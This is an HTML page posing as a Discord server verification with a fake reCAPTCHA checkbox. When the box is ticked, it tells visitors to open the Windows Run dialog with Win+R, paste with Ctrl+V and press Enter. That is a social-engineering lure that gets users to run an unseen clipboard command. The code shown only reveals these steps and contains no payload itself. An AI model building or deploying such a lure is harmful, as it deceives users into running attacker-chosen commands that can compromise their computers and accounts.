<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verify to Access Discord</title>
  <style>
    body {
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
    }

    .container {
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
      text-align: center;
    }

    .title {
      font-size: 1.5em;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .fake-captcha {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      font-size: 1.1em;
      padding: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      cursor: pointer;
      user-select: none;
      background: #fff;
    }

    .fake-captcha input {
      transform: scale(1.5);
      cursor: pointer;
    }

    .popup {
      display: none;
      margin-top: 25px;
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #ccc;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: left;
      width: 350px;
    }

    .popup h3 {
      margin-top: 0;
      color: #007bff;
    }

    .popup ol {
      padding-left: 20px;
    }

    .popup ol li {
      margin-bottom: 10px;
    }

    .popup .box {
      background: #eaffea;
      padding: 10px;
      margin-top: 15px;
      border-left: 4px solid #33cc33;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">Verify to access my Discord server</div>

    <label class="fake-captcha">
      <input type="checkbox" id="verifyCheckbox">
      I'm not a robot
    </label>

    <div class="popup" id="stepPopup">
      <h3>Complete these Verification Steps</h3>
      <ol>
        <li>Press & hold the Windows Key <strong>⊞</strong> + <strong>R</strong></li>
        <li>In the verification window, press <strong>Ctrl + V</strong></li>
        <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
      </ol>
      <div class="box">✅ "I am not a robot - reCAPTCHA Verification ID: 8883"</div>
    </div>
  </div>

  <script>
    const checkbox = document.getElementById('verifyCheckbox');
    const popup = document.getElementById('stepPopup');

    checkbox.addEventListener('change', () => {
      popup.style.display = checkbox.checked ? 'block' : 'none';
    });
  </script>
</body>
</html>
